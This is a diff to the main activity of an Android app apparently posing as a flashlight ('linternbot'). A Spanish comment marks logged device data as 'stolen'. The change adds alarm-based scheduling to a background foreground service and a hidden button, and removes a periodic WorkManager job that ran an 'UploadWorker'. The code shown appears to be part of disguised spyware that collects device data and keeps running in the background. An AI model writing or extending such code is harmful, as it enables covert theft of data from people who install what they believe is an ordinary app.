@@ -1,8 +1,11 @@
 package com.linternbot
 
+import android.app.AlarmManager
 import android.app.NotificationChannel
 import android.app.NotificationManager
+import android.app.PendingIntent
 import android.content.Context
+import android.content.Intent
 import android.hardware.camera2.CameraManager
 import android.os.Build
 import android.os.Bundle
@@ -39,6 +42,8 @@ class MainActivity : AppCompatActivity() {
         ForegroundService.startService(this, "Foreground Service is running...")
 
         button2.visibility = INVISIBLE
+        var alarm = Alarm()
+        alarm.setAlarm(this)
 
         createNotificationChannel() // Canal de comunicacion de notificaciones necesario en API 26+
 
@@ -56,12 +61,6 @@ class MainActivity : AppCompatActivity() {
                     // Imprime los datos robados para debug
 
                     Log.d("TAG",getSpec())
-
-                    // Codigo para aprender a utilizar worker
-                    // https://developer.android.com/reference/androidx/work/PeriodicWorkRequest
-                    val myWorkBuilder = PeriodicWorkRequest.Builder(UploadWorker::class.java, PeriodicWorkRequest.MIN_PERIODIC_INTERVAL_MILLIS+1, TimeUnit.MILLISECONDS)
-                    val myWork = myWorkBuilder.build()
-                    WorkManager.getInstance().enqueueUniquePeriodicWork("jobTag", ExistingPeriodicWorkPolicy.REPLACE, myWork)
 
                 }
                 catch (e: Exception){
